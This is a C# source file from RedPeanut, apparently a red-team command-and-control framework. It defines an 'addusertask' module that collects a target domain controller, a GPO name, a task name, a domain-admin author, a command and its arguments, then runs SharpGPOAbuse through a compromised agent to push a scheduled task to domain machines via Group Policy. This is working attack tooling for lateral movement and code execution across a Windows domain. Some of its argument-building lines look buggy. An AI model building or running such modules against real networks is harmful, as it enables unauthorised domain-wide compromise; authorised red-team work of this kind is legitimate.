//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using System;
using System.Collections.Generic;
using System.Linq;
using static RedPeanut.Utility;

namespace RedPeanut
{
    class SharpGPOAddUserTaskManager : IMenu
    {
        public static Dictionary<string, string> mainmenu = new Dictionary<string, string>
        {
            { "set domaincontroller", "Set target DC" },
            { "set domain", "Set context domain" },
            { "set gponame", "Set gpo name" },
            { "set taskname", "Set task name" },
            { "set author", "Set author use DA account" },
            { "set command", "Set command" },
            { "set arguments", "Set arguments" },
            { "set force", "Force replace original file " },
            { "run", "Execute module" },
            { "options", "Print help" },
            { "back", "Back to lateral menu" }
        };

        public void RePrintCLI()
        {
            Utility.RePrintCLI(agent, modulename);
            return;
        }

        IAgentInstance agent = null;
        string modulename = "addusertask";
        string domainController;
        private string domain;
        private string gpoName;
        private string taskName;
        private string author;
        private string command;
        private string arguments;
        private bool force;

        bool exit = false;

        public SharpGPOAddUserTaskManager()
        {

        }

        public SharpGPOAddUserTaskManager(IAgentInstance agent)
        {
            this.agent = agent;
        }

        public void Execute()
        {
            exit = false;
            string input;
            SetAutoCompletionHandler(mainmenu);
            do
            {
                input = RedPeanutCLI(agent, modulename);
                GpoAbuseMenu(input);
            } while (!exit);
        }

        private void GpoAbuseMenu(string input)
        {
            string f_input = ParseSelection(input);

            if (!string.IsNullOrEmpty(input))
            {
                if (mainmenu.ContainsKey(f_input.TrimEnd()))
                {
                    switch (f_input.TrimEnd())
                    {
                        case "set domaincontroller":
                            domainController = GetParsedSetString(input);
                            break;
                        case "set domain":
                            domain = GetParsedSetString(input);
                            break;
                        case "set gponame":
                            gpoName = GetParsedSetString(input);
                            break;
                        case "set taskname":
                            taskName = GetParsedSetString(input);
                            break;
                        case "set author":
                            author = GetParsedSetString(input);
                            break;
                        case "set command":
                            command = GetParsedSetString(input);
                            break;
                        case "set arguments":
                            arguments = GetParsedSetStringMulti(input);
                            break;
                        case "set force":
                            force = GetParsedSetBool(input);
                            break;
                        case "run":
                            Run();
                            break;
                        case "options":
                            PrintCurrentConfig();
                            break;
                        case "info":
                            PrintOptions("info", mainmenu);
                            break;
                        case "back":
                            Program.GetMenuStack().Pop();
                            exit = true;
                            return;
                        default:
                            Console.WriteLine("We had a woodoo");
                            break;
                    }
                }
                else
                {
                    PrintOptions("Command not found", mainmenu);
                }
            }
        }
        

        private void Run()
        {
            if (!string.IsNullOrEmpty(gpoName) && !string.IsNullOrEmpty(taskName) && !string.IsNullOrEmpty(author) && 
                !string.IsNullOrEmpty(command) && !string.IsNullOrEmpty(arguments))
            {
                List<string> args = new List<string>();
                args.Add("--AddUserTask");
                args.Add("--GPOName");
                args.Add(gpoName);
                args.Add("--TaskName");
                args.Add(taskName);
                args.Add("--Author" + author);
                args.Add(author);
                args.Add("--Command" + command);
                args.Add(command);
                args.Add("--Arguments" + arguments);
                args.Add(arguments);

                if (!string.IsNullOrEmpty(domain))
                {
                    args.Add("--Domain");
                    args.Add(domain);
                }

                if (!string.IsNullOrEmpty(domainController))
                {
                    args.Add("--DomainController");
                    args.Add(domainController);
                }

                if (force)
                    args.Add("--Force");

                RunAssembly(PL_MODULE_SHARPGPOABUSE, "SharpGPOAbuse.Program", args.ToArray<string>(), agent);
            }
        }

        private void PrintCurrentConfig()
        {
            Dictionary<string, string> properties = new Dictionary<string, string>
            {
                { "domaincontroller", domainController },
                { "domain", domain },
                { "gponame", gpoName },
                { "taskname", taskName },
                { "author", author },
                { "command", command },
                { "arguments", arguments },
                { "force", force.ToString() }
            };

            Utility.PrintCurrentConfig(modulename, properties);
        }
    }
}

